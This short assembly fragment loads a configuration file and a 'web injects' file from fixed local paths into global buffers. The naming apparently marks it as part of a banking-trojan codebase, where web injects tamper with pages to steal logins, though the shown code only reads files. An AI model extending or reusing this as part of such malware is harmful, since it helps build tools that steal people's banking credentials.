
.code

;; ==================================================================================================== ;;
;; InitCfg -                                                                                            ;;
;; ==================================================================================================== ;;
InitCfg proc

	invokx  &FileRead[ebx], 'c:\DEVELOP\CONFIG.TXT'
	mov  lpConfigFileData[ebx], eax


	invokx  &FileRead[ebx], 'c:\DEVELOP\INJECTS.TXT'
	mov  lpWebInjectsData[ebx], eax

	ret
InitCfg endp

	lpConfigFileData dd 0
	lpWebInjectsData dd 0
